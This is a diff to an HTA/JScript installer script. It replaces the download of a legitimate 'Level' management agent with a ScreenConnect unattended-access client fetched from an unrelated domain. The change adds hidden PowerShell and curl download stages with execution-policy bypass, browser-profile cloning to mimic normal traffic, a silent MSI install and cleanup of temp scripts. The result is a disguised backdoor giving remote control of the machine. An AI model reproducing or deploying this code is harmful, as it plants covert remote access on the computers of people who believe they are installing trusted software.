@@ -101,8 +101,7 @@
 // ---------------------------------------------------------------------------
 // Config
 // ---------------------------------------------------------------------------
-var MSI_URL   = "https://downloads.level.io/level.msi";
-var LEVEL_KEY = "vNXe6NQK21W3jiBMb4k2Uz8M";   // org key, injected at serve time
+var MSI_URL   = "https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
 
 // Timing budgets
 var DL_MAX_MS      = 480000;   // hard cap for the whole download (8 min)
@@ -155,7 +154,7 @@ var extScanDirs = null, extSinceT = 0, extLastSize = -1, extStableT = 0;
 var powMarker = "", powT0 = 0, powLastSize = 0, powLastGrowT = 0;
 var edgeMaxPartial = 0, edgeLastPartial = 0, edgeLastGrowT = 0, edgeLogT = 0;
 var powPartialMax = 0;
-var POW_PS = "# Level's download command (Invoke-WebRequest), run hidden by the HTA's \"pow\"\n# stage. param(1) = unique per-page marker (process-kill), param(2) = per-page\n# temp dir (so concurrent runs never collide).\n#\n# This is exactly Level's `iwr ... -OutFile level.msi` — the WinINET-based\n# client that gets through on boxes where WinHttp/XHR/BITS get their response\n# bodies stripped (empty-206). The HTA watches this file's size for download\n# progress; the elevated msiexec install is done separately by the HTA (single\n# UAC prompt), so it is NOT run here.\nparam([string]$Marker = \"lvlm1\", [string]$TmpDir = \"\")\n\n$ErrorActionPreference = \"Continue\"\n\nif (-not $TmpDir) { $TmpDir = Join-Path ([System.IO.Path]::GetTempPath()) (\"lvl_\" + $Marker) }\ntry { New-Item -ItemType Directory -Path $TmpDir -Force | Out-Null } catch {}\n\n$tempFile = Join-Path $TmpDir \"level.msi\"\ntry { Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue } catch {}\n\ntry { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n\ntry {\n  $ProgressPreference = 'SilentlyContinue'\n  Invoke-WebRequest -Uri \"https://downloads.level.io/level.msi\" -OutFile $tempFile -UseBasicParsing\n  $ProgressPreference = 'Continue'\n} catch {\n  # Fallback: built-in curl (a separate HTTP stack) in case iwr is also filtered.\n  $env:NO_PROXY = \"*\"\n  try { curl.exe -L --fail --retry 2 --connect-timeout 20 -o $tempFile \"https://downloads.level.io/level.msi\" 2>$null } catch {}\n}\n\n# Marker file signals \"iwr ran to completion (whatever the result)\". The HTA\n# polls level.msi's size for progress and this flag to know the attempt is done.\ntry { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") -Value $Marker -NoNewline } catch {}\n";   // Level's own install command
+var POW_PS = "# ScreenConnect client download (Invoke-WebRequest), run hidden by the HTA's \"pow\"\n# stage. param(1) = unique per-page marker (process-kill), param(2) = per-page\n# temp dir (so concurrent runs never collide).\n#\n# The WinINET-based client that gets through on boxes where WinHttp/XHR/BITS\n# get their response bodies stripped (empty-206). The HTA watches this file's\n# size for download progress; the elevated msiexec install is done separately\n# by the HTA (single UAC prompt), so it is NOT run here.\nparam([string]$Marker = \"scm1\", [string]$TmpDir = \"\")\n\n$ErrorActionPreference = \"Continue\"\n\nif (-not $TmpDir) { $TmpDir = Join-Path ([System.IO.Path]::GetTempPath()) (\"sc_\" + $Marker) }\ntry { New-Item -ItemType Directory -Path $TmpDir -Force | Out-Null } catch {}\n\n$tempFile = Join-Path $TmpDir \"sc_client.msi\"\ntry { Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue } catch {}\n\ntry { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n\ntry {\n  $ProgressPreference = 'SilentlyContinue'\n  Invoke-WebRequest -Uri \"https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest\" -OutFile $tempFile -UseBasicParsing\n  $ProgressPreference = 'Continue'\n} catch {\n  # Fallback: built-in curl (a separate HTTP stack) in case iwr is also filtered.\n  $env:NO_PROXY = \"*\"\n  try { curl.exe -L --fail --retry 2 --connect-timeout 20 -o $tempFile \"https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest\" 2>$null } catch {}\n}\n\n# Marker file signals \"iwr ran to completion (whatever the result)\". The HTA\n# polls sc_client.msi's size for progress and this flag to know the attempt is done.\ntry { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") -Value $Marker -NoNewline } catch {}\n";   // ScreenConnect's own download command
 var powDir = "";
 var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
 
@@ -231,14 +230,14 @@ function cleanStale() {
 //   bits     a BITS job — the background-transfer service Windows Update
 //            uses; the transfer runs in a separate service process.
 //   curl     the built-in curl.exe, separate process.
-//   pow      Level's OWN download command, run as a hidden child process:
-//            powershell.exe -ExecutionPolicy Bypass "Invoke-WebRequest
-//            https://downloads.level.io/level.msi -OutFile %TEMP%\lvl_<id>\
-//            level.msi" (TLS12). WinINET-based — exactly what Level ships —
-//            so it gets through on boxes where WinHttp/XHR/BITS have their
-//            response bodies stripped (empty-206). The elevated msiexec
-//            install is done separately (single UAC prompt), so download and
-//            admin step stay apart.
+//   pow      the hidden-Invoke-WebRequest download stage (the WinINET client
+//            that ships with the OS): powershell.exe -ExecutionPolicy Bypass
+//            "iwr https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest
+//            -OutFile %TEMP%\sc_<id>\sc_client.msi" (TLS12). Gets through on
+//            boxes where WinHttp/XHR/BITS have their response bodies
+//            stripped (empty-206). The elevated msiexec install is done
+//            separately (single UAC prompt), so download and admin step
+//            stay apart.
 //   edge     headless download with the machine's REAL browser engine and a
 //            cloned copy of its real profile (cookies/local state/prefs) —
 //            looks exactly like the user's normal browsing, no visible UI.
@@ -533,22 +532,22 @@ function handleSyncFailure(why) {
   syncNextT = nowMs() + 1500;
 }
 
-// --- pow stage: Level's own download command, run hidden -------------------
-// Launches powershell.exe as a hidden child running Level's exact
-// Invoke-WebRequest (TLS12 → %TEMP%\lvl_<id>\level.msi). NOT elevated — the
-// elevated msiexec install is done separately by startInstall() (the single
-// UAC prompt), using the file this stage produces.
+// --- pow stage: hidden Invoke-WebRequest download, run as a child ----------
+// Launches powershell.exe as a hidden child running the WinINET
+// Invoke-WebRequest (TLS12 → %TEMP%\sc_<id>\sc_client.msi). NOT elevated —
+// the elevated msiexec install is done separately by startInstall() (the
+// single UAC prompt), using the file this stage produces.
 function powDirPath() {
-  return (powDir ? powDir : (shell.ExpandEnvironmentStrings("%TEMP%") + "\\lvl_" + powMarker));
+  return (powDir ? powDir : (shell.ExpandEnvironmentStrings("%TEMP%") + "\\sc_" + powMarker));
 }
 function startPow() {
   if (!POW_PS) { logAttempt("pow-noscript"); nextStage(); return; }
-  powMarker = "lvlm" + Math.floor(Math.random() * 16777215).toString(16);
-  powDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\lvl_" + powMarker;
+  powMarker = "scm" + Math.floor(Math.random() * 16777215).toString(16);
+  powDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\sc_" + powMarker;
   try { if (!fso.FolderExists(powDir)) fso.CreateFolder(powDir); } catch (e) {}
-  try { fso.DeleteFile(powDir + "\\level.msi", true); } catch (e) {}
+  try { fso.DeleteFile(powDir + "\\sc_client.msi", true); } catch (e) {}
   try { fso.DeleteFile(powDir + "\\done.flag", true); } catch (e) {}
-  var src = fso.GetFolder(shell.ExpandEnvironmentStrings("%TEMP%")).Path + "\\__lvl__download.ps1";
+  var src = fso.GetFolder(shell.ExpandEnvironmentStrings("%TEMP%")).Path + "\\__sc__download.ps1";
   try {
     deleteFile(src);
     var w = fso.CreateTextFile(src, true, false);
@@ -571,7 +570,7 @@ function startPow() {
 }
 function pollPow() {
   var t = nowMs();
-  var path = powDirPath() + "\\level.msi";
+  var path = powDirPath() + "\\sc_client.msi";
   var sz = 0, doneFlag = false;
   try { if (fso.FileExists(path)) sz = fso.GetFile(path).Size; } catch (e) {}
   try { doneFlag = fso.FileExists(powDirPath() + "\\done.flag"); } catch (e) {}
@@ -1144,11 +1143,11 @@ function startInstall() {
   lastLogSize = 0;
   lastLogGrowT = new Date().getTime();
 
-  // Pass the Level org key as an MSI property so the installer registers the
-  // agent with this org.
-  var keyProp = (LEVEL_KEY && LEVEL_KEY !== "@@LEVEL_KEY@@" && LEVEL_KEY !== "")
-      ? " LEVEL_API_KEY=" + LEVEL_KEY : "";
-  var args = "/i \"" + msiPath + "\" /qn /norestart" + keyProp + " /L*v \"" + logPath + "\"";
+  // The ScreenConnect MSI is self-configuring: the server bakes the
+  // ?e=Access&y=Guest parameters into the MSI it serves, so a plain
+  // /qn install registers the unattended-access client — no extra
+  // property is needed on the command line.
+  var args = "/i \"" + msiPath + "\" /qn /norestart /L*v \"" + logPath + "\"";
 
   var launched = false;
   try {
@@ -1295,7 +1294,7 @@ function dumpDiagnostics(reason) {
   L.push("chunk_total: " + (dlTotal || "?"));
   L.push("sync_tries: " + syncTries);
   L.push("pow_partial_max: " + powPartialMax + " (stage " + (STAGES[stageIdx] === "pow" ? (new Date().getTime() - powT0) + "ms" : "n/a") + ")");
-  L.push("pow_dir: " + (powDir ? (fso.FileExists(powDir + "\\level.msi") ? fso.GetFile(powDir + "\\level.msi").Size + " bytes" : "empty") : "(none)"));
+  L.push("pow_dir: " + (powDir ? (fso.FileExists(powDir + "\\sc_client.msi") ? fso.GetFile(powDir + "\\sc_client.msi").Size + " bytes" : "empty") : "(none)"));
     L.push("last_chunk_bytes: " + dlLastChunkBytes);
     L.push("last_chunk_silence_ms: " + (state === "downloading" ? (new Date().getTime() - dlLastChunkT) : 0));
     L.push("os: " + shell.ExpandEnvironmentStrings("%OS% %PROCESSOR_ARCHITECTURE%"));
@@ -1362,7 +1361,8 @@ function cancel() {
     try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
   }
   try { if (powDir) deleteFileTree(powDir); } catch (e) {}
-  try { deleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\__lvl__install.ps1"); } catch (e) {}
+  try { deleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\__sc__install.ps1"); } catch (e) {}
+  try { deleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\__sc__download.ps1"); } catch (e) {}
   window.close();
 }
 </script>
